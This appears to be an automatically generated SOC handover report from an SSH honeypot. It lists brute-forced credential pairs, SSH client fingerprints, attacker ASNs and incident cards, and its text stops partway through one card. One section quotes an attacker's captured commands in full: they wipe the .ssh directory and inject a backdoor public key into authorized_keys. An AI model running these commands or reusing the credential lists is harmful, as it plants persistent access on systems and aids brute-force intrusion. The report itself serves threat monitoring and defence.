# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-15 |
| **Generated At** | 2026-08-15T10:27:07Z |
| **Shift Time** | 10:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **6500** |
| Confirmed Threats | **6467** |
| False Positives Filtered | **33** (0.5%) |
| Unique Attacker IPs | **93** |
| Countries of Origin | **32** |
| High Severity Cases | **210** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **6290** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **238** |
| Unique Credential Pairs | **191** |
| Unique Usernames | **50** |
| Unique Passwords | **153** |
| Successful Auth Pairs | **224** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `admin` | 28 |
| `test` | 25 |
| `user1` | 15 |
| `user` | 14 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin123` | 7 |
| `00000` | 7 |
| `123123123` | 6 |
| `1q2w3e4r` | 5 |
| `33333` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `default` | `admin123` | 6 |
| `Admin` | `00000` | 6 |
| `admin` | `123123123` | 6 |
| `test` | `1q2w3e4r` | 5 |
| `support` | `33333` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `test` | `1q2w3e4r` | `91.92.42.7` | 2026-08-15T06:55:06 |
| `test` | `test1234567` | `91.92.42.7` | 2026-08-15T06:55:12 |
| `weblogic` | `1` | `91.92.42.7` | 2026-08-15T06:55:17 |
| `web` | `!QAZ2wsx` | `91.92.42.7` | 2026-08-15T06:55:23 |
| `root` | `1992` | `91.92.42.7` | 2026-08-15T06:55:29 |
| `support` | `33333` | `10.0.0.73` | 2026-08-15T06:55:31 |
| `admin` | `09121980` | `91.92.42.7` | 2026-08-15T06:55:37 |
| `admin` | `12031981` | `91.92.42.7` | 2026-08-15T06:55:43 |
| `test` | `1234567890` | `91.92.42.7` | 2026-08-15T06:55:49 |
| `user2` | `123qwe` | `91.92.42.7` | 2026-08-15T06:55:55 |
| `weblogic` | `password1234567` | `91.92.42.7` | 2026-08-15T06:56:01 |
| `ubnt` | `ubnt77` | `91.92.42.7` | 2026-08-15T06:56:07 |
| `user0` | `lobby` | `91.92.42.7` | 2026-08-15T06:56:11 |
| `test` | `111111` | `91.92.42.7` | 2026-08-15T06:56:17 |
| `root` | `pfsense` | `91.92.42.7` | 2026-08-15T06:56:23 |
| `weblogic` | `weblogic123456` | `91.92.42.7` | 2026-08-15T06:56:28 |
| `web` | `QAZ2wsx` | `91.92.42.7` | 2026-08-15T06:56:34 |
| `user` | `QAZ@WSX` | `91.92.42.7` | 2026-08-15T06:56:39 |
| `user0` | `1qaz@wsx` | `91.92.42.7` | 2026-08-15T06:56:44 |
| `admin` | `100001` | `91.92.42.7` | 2026-08-15T06:56:50 |
| `ansible` | `password` | `91.92.42.7` | 2026-08-15T06:56:55 |
| `web` | `password123` | `91.92.42.7` | 2026-08-15T06:57:00 |
| `test` | `qwerty` | `91.92.42.7` | 2026-08-15T06:57:06 |
| `test` | `QAZ@WSX` | `91.92.42.7` | 2026-08-15T06:57:11 |
| `test` | `test1` | `91.92.42.7` | 2026-08-15T06:57:17 |
| `frank` | `123456` | `91.92.42.7` | 2026-08-15T06:57:22 |
| `user` | `zcadqe` | `91.92.42.7` | 2026-08-15T06:57:28 |
| `test` | `admin123` | `91.92.42.7` | 2026-08-15T06:57:36 |
| `user1` | `password123` | `91.92.42.7` | 2026-08-15T06:57:43 |
| `test` | `google` | `91.92.42.7` | 2026-08-15T06:57:49 |
| `supervisor` | `0000` | `91.92.42.7` | 2026-08-15T06:57:54 |
| `root` | `zaq1xsw2cde3` | `91.92.42.7` | 2026-08-15T06:58:01 |
| `weblogic` | `weblogic1234567` | `91.92.42.7` | 2026-08-15T06:58:08 |
| `user1` | `password123456789` | `91.92.42.7` | 2026-08-15T06:58:13 |
| `support` | `qwerty1234` | `91.92.42.7` | 2026-08-15T06:58:20 |
| `user0` | `@abc123` | `91.92.42.7` | 2026-08-15T06:58:26 |
| `root` | `1qaz2wsx3edc4rfv` | `91.92.42.7` | 2026-08-15T06:58:32 |
| `universidad` | `universidad` | `91.92.42.7` | 2026-08-15T06:58:38 |
| `user3` | `1qaz2wsx` | `91.92.42.7` | 2026-08-15T06:58:43 |
| `ziggo` | `draadloos` | `91.92.42.7` | 2026-08-15T06:58:50 |
| `web` | `password123456` | `91.92.42.7` | 2026-08-15T06:58:56 |
| `web` | `web123456789` | `91.92.42.7` | 2026-08-15T06:59:02 |
| `rebecca` | `rebecca` | `91.92.42.7` | 2026-08-15T06:59:09 |
| `asterisk` | `12345678` | `91.92.42.7` | 2026-08-15T06:59:14 |
| `admin` | `0l0ctyQh243O63uD` | `91.92.42.7` | 2026-08-15T06:59:20 |
| `user1` | `password12345678` | `91.92.42.7` | 2026-08-15T06:59:25 |
| `user1` | `user112345` | `91.92.42.7` | 2026-08-15T06:59:31 |
| `user1` | `ZAQ!xsw2` | `91.92.42.7` | 2026-08-15T06:59:37 |
| `weblogic` | `weblogic12345678` | `91.92.42.7` | 2026-08-15T06:59:43 |
| `test` | `qwe123` | `91.92.42.7` | 2026-08-15T06:59:49 |
| `user3` | `123qwe` | `91.92.42.7` | 2026-08-15T06:59:55 |
| `weblogic` | `1234` | `91.92.42.7` | 2026-08-15T07:00:00 |
| `test` | `1q2w3e` | `91.92.42.7` | 2026-08-15T07:00:06 |
| `admin` | `1147` | `91.92.42.7` | 2026-08-15T07:00:12 |
| `test` | `654321` | `91.92.42.7` | 2026-08-15T07:00:19 |
| `user1` | `lobby` | `91.92.42.7` | 2026-08-15T07:00:26 |
| `root` | `lobby` | `91.92.42.7` | 2026-08-15T07:00:31 |
| `test` | `password12345678` | `91.92.42.7` | 2026-08-15T07:00:38 |
| `user` | `user22` | `91.92.42.7` | 2026-08-15T07:00:44 |
| `stefani` | `stefani` | `91.92.42.7` | 2026-08-15T07:00:50 |
| `user1` | `password1` | `91.92.42.7` | 2026-08-15T07:00:56 |
| `root` | `Aa112211` | `91.92.42.7` | 2026-08-15T07:01:01 |
| `test` | `test123456` | `91.92.42.7` | 2026-08-15T07:01:08 |
| `support` | `support8` | `91.92.42.7` | 2026-08-15T07:01:13 |
| `user1` | `12345678` | `91.92.42.7` | 2026-08-15T07:01:19 |
| `admin` | `1069` | `91.92.42.7` | 2026-08-15T07:01:25 |
| `web` | `password12345` | `91.92.42.7` | 2026-08-15T07:01:30 |
| `weblogic` | `QAZ@WSX` | `91.92.42.7` | 2026-08-15T07:01:37 |
| `admin` | `trustix` | `91.92.42.7` | 2026-08-15T07:01:42 |
| `user2` | `ZAQ!xsw2` | `91.92.42.7` | 2026-08-15T07:01:49 |
| `test` | `1q2w3e4r5t` | `91.92.42.7` | 2026-08-15T07:01:55 |
| `user1` | `lobby01` | `91.92.42.7` | 2026-08-15T07:02:01 |
| `luther` | `luther` | `91.92.42.7` | 2026-08-15T07:02:07 |
| `supervisor` | `supervisor77` | `91.92.42.7` | 2026-08-15T07:02:13 |
| `weblogic` | `password1234` | `91.92.42.7` | 2026-08-15T07:02:19 |
| `khadijah` | `khadijah` | `91.92.42.7` | 2026-08-15T07:02:25 |
| `centos` | `centos123` | `91.92.42.7` | 2026-08-15T07:02:31 |
| `apache` | `Apache123` | `91.92.42.7` | 2026-08-15T07:02:38 |
| `weblogic` | `!QAZ@WSX` | `91.92.42.7` | 2026-08-15T07:02:44 |
| `root` | `dev1234` | `91.92.42.7` | 2026-08-15T07:02:50 |
| `root` | `wl123456` | `91.92.42.7` | 2026-08-15T07:02:56 |
| `test` | `987654321` | `91.92.42.7` | 2026-08-15T07:03:02 |
| `rayne` | `rayne` | `91.92.42.7` | 2026-08-15T07:03:08 |
| `victor` | `1` | `91.92.42.7` | 2026-08-15T07:03:14 |
| `unknown` | `5555` | `91.92.42.7` | 2026-08-15T07:03:20 |
| `root` | `12345s` | `91.92.42.7` | 2026-08-15T07:03:25 |
| `root` | `@abc123` | `91.92.42.7` | 2026-08-15T07:03:32 |
| `user1` | `ZAQ!XSW@` | `91.92.42.7` | 2026-08-15T07:03:37 |
| `apache` | `P@ssw0rd` | `91.92.42.7` | 2026-08-15T07:03:43 |
| `ec2-user` | `ec2-user12` | `91.92.42.7` | 2026-08-15T07:03:49 |
| `user2` | `1qaz@WSX` | `91.92.42.7` | 2026-08-15T07:03:55 |
| `user` | `password12345` | `91.92.42.7` | 2026-08-15T07:04:01 |
| `root` | `1qaz3edc` | `91.92.42.7` | 2026-08-15T07:04:07 |
| `user1` | `zcadqe` | `91.92.42.7` | 2026-08-15T07:04:13 |
| `user` | `zaq!xsw@` | `91.92.42.7` | 2026-08-15T07:04:19 |
| `user1` | `1qaz2wsx` | `91.92.42.7` | 2026-08-15T07:04:24 |
| `root` | `123qweASD` | `217.165.22.192` | 2026-08-15T07:04:28 |
| `user2` | `omn` | `91.92.42.7` | 2026-08-15T07:04:30 |
| `ftpuser` | `asteriskftp` | `91.92.42.7` | 2026-08-15T07:04:36 |
| `user3` | `1qaz@wsx` | `91.92.42.7` | 2026-08-15T07:04:42 |
| `web` | `!QAZ@WSX` | `91.92.42.7` | 2026-08-15T07:04:47 |
| `user` | `user123` | `91.92.42.7` | 2026-08-15T07:04:53 |
| `user0` | `123456` | `91.92.42.7` | 2026-08-15T07:05:00 |
| `user` | `password123` | `91.92.42.7` | 2026-08-15T07:05:05 |
| `root` | `1234!@#$` | `91.92.42.7` | 2026-08-15T07:05:12 |
| `test` | `test7` | `91.92.42.7` | 2026-08-15T07:05:18 |
| `supervisor` | `abcd1234` | `91.92.42.7` | 2026-08-15T07:05:23 |
| `user1` | `password1234567` | `91.92.42.7` | 2026-08-15T07:05:29 |
| `root` | `zxcvbnm` | `91.92.42.7` | 2026-08-15T07:05:34 |
| `admin` | `admin123!@#` | `91.92.42.7` | 2026-08-15T07:05:41 |
| `user` | `user33` | `91.92.42.7` | 2026-08-15T07:05:47 |
| `web` | `password12345678` | `91.92.42.7` | 2026-08-15T07:05:53 |
| `admin` | `09091992` | `91.92.42.7` | 2026-08-15T07:05:59 |
| `user0` | `ZAQ!XSW@` | `91.92.42.7` | 2026-08-15T07:06:04 |
| `user1` | `user1123456789` | `91.92.42.7` | 2026-08-15T07:06:09 |
| `web` | `QAZ@WSX` | `91.92.42.7` | 2026-08-15T07:06:14 |
| `hos` | `123` | `91.92.42.7` | 2026-08-15T07:06:20 |
| `dockeruser` | `12345` | `91.92.42.7` | 2026-08-15T07:06:28 |
| `guest` | `123qwe` | `91.92.42.7` | 2026-08-15T07:06:34 |
| `web` | `web1` | `91.92.42.7` | 2026-08-15T07:06:39 |
| `admin` | `admin1234567` | `37.28.177.141` | 2026-08-15T07:06:41 |
| `init` | `init` | `91.92.42.7` | 2026-08-15T07:06:45 |
| `admin` | `test` | `10.0.0.73` | 2026-08-15T07:06:48 |
| `user3` | `zaqxsw` | `91.92.42.7` | 2026-08-15T07:06:51 |
| `user3` | `1qaz2wsx3edc4rfv` | `91.92.42.7` | 2026-08-15T07:06:56 |
| `user0` | `1qaz2wsx3edc` | `91.92.42.7` | 2026-08-15T07:07:02 |
| `weblogic` | `password12345` | `91.92.42.7` | 2026-08-15T07:07:08 |
| `user` | `!QAZ@WSX` | `91.92.42.7` | 2026-08-15T07:07:13 |
| `backup` | `123qwe` | `91.92.42.7` | 2026-08-15T07:07:19 |
| `user2` | `1qaz321x` | `91.92.42.7` | 2026-08-15T07:07:25 |
| `backup` | `wasd` | `91.92.42.7` | 2026-08-15T07:07:33 |
| `web` | `12345678` | `91.92.42.7` | 2026-08-15T07:07:40 |
| `btf` | `321start` | `91.92.42.7` | 2026-08-15T07:07:45 |
| `user` | `blog` | `91.92.42.7` | 2026-08-15T07:07:50 |
| `test` | `12` | `91.92.42.7` | 2026-08-15T07:07:57 |
| `admin` | `nosoup4u` | `91.92.42.7` | 2026-08-15T07:08:02 |
| `root` | `12341234` | `91.92.42.7` | 2026-08-15T07:08:08 |
| `admin` | `110986` | `91.92.42.7` | 2026-08-15T07:08:13 |
| `user1` | `1qaz2wsx3edc` | `91.92.42.7` | 2026-08-15T07:08:19 |
| `root` | `asdfghjkl` | `91.92.42.7` | 2026-08-15T07:08:25 |
| `admin` | `121084` | `91.92.42.7` | 2026-08-15T07:08:31 |
| `user` | `Huawei@123` | `91.92.42.7` | 2026-08-15T07:08:36 |
| `leonardo` | `leonardo` | `91.92.42.7` | 2026-08-15T07:08:42 |
| `user` | `@abc123` | `91.92.42.7` | 2026-08-15T07:08:47 |
| `test` | `zxcvbnm` | `91.92.42.7` | 2026-08-15T07:08:52 |
| `admin` | `090807` | `91.92.42.7` | 2026-08-15T07:08:58 |
| `backup` | `54321` | `91.92.42.7` | 2026-08-15T07:09:04 |
| `ubnt` | `jackson` | `91.92.42.7` | 2026-08-15T07:09:09 |
| `arleth` | `arleth` | `91.92.42.7` | 2026-08-15T07:09:14 |
| `user` | `1QAZ2WSX` | `91.92.42.7` | 2026-08-15T07:09:20 |
| `ton` | `123` | `91.92.42.7` | 2026-08-15T07:09:26 |
| `user` | `!QAZ2wsx` | `91.92.42.7` | 2026-08-15T07:09:32 |
| `unknown` | `unknown5` | `91.92.42.7` | 2026-08-15T07:09:37 |
| `root` | `qwer.1234` | `91.92.42.7` | 2026-08-15T07:09:43 |
| `backup` | `backup123` | `91.92.42.7` | 2026-08-15T07:09:49 |
| `whitley` | `whitley` | `91.92.42.7` | 2026-08-15T07:09:55 |
| `admin` | `11101994` | `91.92.42.7` | 2026-08-15T07:10:01 |
| `admin` | `black13` | `91.92.42.7` | 2026-08-15T07:10:05 |
| `nobody` | `nobody12345678` | `91.92.42.7` | 2026-08-15T07:10:12 |
| `dorien` | `dorien` | `91.92.42.7` | 2026-08-15T07:10:17 |
| `test5` | `test5` | `91.92.42.7` | 2026-08-15T07:10:23 |
| `root` | `55555` | `117.39.63.46` | 2026-08-15T07:12:09 |
| `root` | `55555` | `50.188.204.213` | 2026-08-15T07:12:18 |
| `support` | `33333` | `218.29.231.106` | 2026-08-15T07:13:57 |
| `support` | `33333` | `178.216.165.187` | 2026-08-15T07:14:05 |
| `support` | `33333` | `60.171.135.254` | 2026-08-15T07:14:09 |
| `rose` | `rose2025` | `20.193.141.133` | 2026-08-15T07:15:59 |
| `345gs5662d34` | `345gs5662d34` | `20.193.141.133` | 2026-08-15T07:16:03 |
| `hunter` | `hunter` | `118.163.145.175` | 2026-08-15T07:16:04 |
| `rose` | `3245gs5662d34` | `20.193.141.133` | 2026-08-15T07:16:04 |
| `root` | `0000` | `45.142.193.164` | 2026-08-15T07:16:10 |
| `hunter` | `hunter` | `117.252.93.114` | 2026-08-15T07:16:16 |
| `root` | `55555` | `10.0.0.73` | 2026-08-15T07:23:30 |
| `root` | `1qaz!QAZ` | `217.165.22.192` | 2026-08-15T07:23:42 |
| `admin` | `test` | `117.158.166.73` | 2026-08-15T07:24:53 |
| `admin` | `test` | `60.220.241.50` | 2026-08-15T07:25:07 |
| `default` | `admin123` | `10.0.0.73` | 2026-08-15T07:29:26 |
| `support` | `support` | `176.53.159.196` | 2026-08-15T07:30:25 |
| `root` | `00000` | `45.142.193.164` | 2026-08-15T07:38:53 |
| `root` | `55555` | `222.75.225.206` | 2026-08-15T07:40:56 |
| `Admin` | `00000` | `10.0.0.73` | 2026-08-15T07:41:03 |
| `Admin` | `00000` | `178.178.222.59` | 2026-08-15T07:42:42 |
| `Admin` | `00000` | `196.189.126.10` | 2026-08-15T07:42:51 |
| `root` | `102030` | `217.165.22.192` | 2026-08-15T07:42:55 |
| `admin` | `654321` | `10.0.0.73` | 2026-08-15T07:44:10 |
| `default` | `admin123` | `117.39.63.46` | 2026-08-15T07:47:45 |
| `default` | `admin123` | `182.42.113.10` | 2026-08-15T07:47:55 |
| `default` | `admin123` | `177.159.150.111` | 2026-08-15T07:48:00 |
| `default` | `admin123` | `220.246.46.144` | 2026-08-15T07:48:10 |
| `root` | `﻿------fuck------` | `1.92.151.36` | 2026-08-15T07:51:46 |
| `a` | `a` | `165.232.61.133` | 2026-08-15T07:52:41 |
| `support` | `support` | `10.0.0.73` | 2026-08-15T07:55:18 |
| `centos` | `p@ssw0rd` | `10.0.0.73` | 2026-08-15T07:57:41 |
| `Admin` | `00000` | `121.179.93.147` | 2026-08-15T07:58:58 |
| `Admin` | `00000` | `178.178.194.135` | 2026-08-15T07:59:06 |
| `root` | `000000` | `45.142.193.164` | 2026-08-15T08:01:36 |
| `root` | `master` | `217.165.22.192` | 2026-08-15T08:02:09 |
| `admin` | `123123123` | `10.0.0.73` | 2026-08-15T08:03:30 |
| `test` | `abc123` | `10.0.0.73` | 2026-08-15T08:07:06 |
| `supervisor` | `ubuntu` | `82.102.188.117` | 2026-08-15T08:08:13 |
| `supervisor` | `ubuntu` | `60.172.41.103` | 2026-08-15T08:08:29 |
| `centos` | `p@ssw0rd` | `122.187.235.148` | 2026-08-15T08:14:52 |
| `centos` | `p@ssw0rd` | `31.173.0.46` | 2026-08-15T08:15:01 |
| `test` | `1q2w3e4r` | `10.0.0.73` | 2026-08-15T08:15:26 |
| `test` | `1q2w3e4r` | `213.55.79.195` | 2026-08-15T08:16:44 |
| `test` | `1q2w3e4r` | `196.188.93.169` | 2026-08-15T08:16:53 |
| `User` | `123321` | `10.0.0.73` | 2026-08-15T08:19:59 |
| `ubnt` | `logon` | `211.169.212.206` | 2026-08-15T08:20:07 |
| `ubnt` | `logon` | `82.102.149.88` | 2026-08-15T08:20:15 |
| `deploy` | `deploy@123` | `217.165.22.192` | 2026-08-15T08:21:22 |
| `admin` | `123123123` | `178.178.194.131` | 2026-08-15T08:21:50 |
| `admin` | `123123123` | `195.222.57.190` | 2026-08-15T08:21:57 |
| `admin` | `123123123` | `203.252.10.4` | 2026-08-15T08:22:05 |
| `admin` | `123123123` | `190.223.36.108` | 2026-08-15T08:22:14 |
| `root` | `0000000` | `45.142.193.164` | 2026-08-15T08:24:16 |
| `ubnt` | `logon` | `10.0.0.73` | 2026-08-15T08:31:40 |
| `test` | `1q2w3e4r` | `189.56.0.19` | 2026-08-15T08:33:13 |
| `centos` | `qwerty1` | `10.0.0.73` | 2026-08-15T08:37:16 |
| `root` | `1234` | `217.165.22.192` | 2026-08-15T08:40:36 |
| `default` | `qwerty123456` | `93.177.157.179` | 2026-08-15T08:45:54 |
| `default` | `qwerty123456` | `111.39.167.59` | 2026-08-15T08:46:03 |
| `root` | `00000000` | `45.142.193.164` | 2026-08-15T08:47:01 |
| `nobody` | `Password` | `10.0.0.73` | 2026-08-15T08:49:21 |
| `nobody` | `Password` | `60.166.8.174` | 2026-08-15T08:51:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **6500** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 177 |
| OpenSSH | 36 |
| libssh | 8 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 157 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 35 | 34 |
| `e45f2d6d7f79...` | Mirai/variant | 6 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 5 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 157 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 35 | 34 | Mirai/variant |
| `e45f2d6d7f79...` | Go SSH scanner | 6 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `98ddc5604ef6...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.193.141.133`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **93** |
| Unique ASNs | **67** |
| High-Risk ASNs | **53** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS25159` | PJSC MegaFon | 5 | HIGH |
| `AS202845` | LLC Unetco Corp | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS24757` | Ethio Telecom | 3 | HIGH |
| `AS12400` | Partner Communications Ltd. | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS6568` | EMPRESA NACIONAL DE TELECOMUNICACIONES SOCIEDAD ANONIMA | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (210)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-937d97388cf6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:05` | `cowrie.session.connect` |
| `2026-08-15 06:55:05` | `cowrie.client.version` |
| `2026-08-15 06:55:05` | `cowrie.client.kex` |
| `2026-08-15 06:55:06` | `cowrie.login.success` |
| `2026-08-15 06:55:07` | `cowrie.session.params` |
| `2026-08-15 06:55:07` | `cowrie.command.input` |
| `2026-08-15 06:55:07` | `cowrie.log.closed` |
| `2026-08-15 06:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27261cc5e4c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:11` | `cowrie.session.connect` |
| `2026-08-15 06:55:11` | `cowrie.client.version` |
| `2026-08-15 06:55:11` | `cowrie.client.kex` |
| `2026-08-15 06:55:12` | `cowrie.login.success` |
| `2026-08-15 06:55:12` | `cowrie.session.params` |
| `2026-08-15 06:55:13` | `cowrie.command.input` |
| `2026-08-15 06:55:13` | `cowrie.log.closed` |
| `2026-08-15 06:55:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ebfe2385eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:17` | `cowrie.session.connect` |
| `2026-08-15 06:55:17` | `cowrie.client.version` |
| `2026-08-15 06:55:17` | `cowrie.client.kex` |
| `2026-08-15 06:55:17` | `cowrie.login.success` |
| `2026-08-15 06:55:18` | `cowrie.session.params` |
| `2026-08-15 06:55:18` | `cowrie.command.input` |
| `2026-08-15 06:55:19` | `cowrie.log.closed` |
| `2026-08-15 06:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea727ba6d37f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:22` | `cowrie.session.connect` |
| `2026-08-15 06:55:22` | `cowrie.client.version` |
| `2026-08-15 06:55:23` | `cowrie.client.kex` |
| `2026-08-15 06:55:23` | `cowrie.login.success` |
| `2026-08-15 06:55:24` | `cowrie.session.params` |
| `2026-08-15 06:55:24` | `cowrie.command.input` |
| `2026-08-15 06:55:25` | `cowrie.log.closed` |
| `2026-08-15 06:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebb8354515b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:29` | `cowrie.session.connect` |
| `2026-08-15 06:55:29` | `cowrie.client.version` |
| `2026-08-15 06:55:29` | `cowrie.client.kex` |
| `2026-08-15 06:55:29` | `cowrie.login.success` |
| `2026-08-15 06:55:31` | `cowrie.session.params` |
| `2026-08-15 06:55:31` | `cowrie.command.input` |
| `2026-08-15 06:55:31` | `cowrie.log.closed` |
| `2026-08-15 06:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8210c5b58d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:35` | `cowrie.session.connect` |
| `2026-08-15 06:55:35` | `cowrie.client.version` |
| `2026-08-15 06:55:35` | `cowrie.client.kex` |
| `2026-08-15 06:55:37` | `cowrie.login.success` |
| `2026-08-15 06:55:39` | `cowrie.session.params` |
| `2026-08-15 06:55:39` | `cowrie.command.input` |
| `2026-08-15 06:55:39` | `cowrie.log.closed` |
| `2026-08-15 06:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
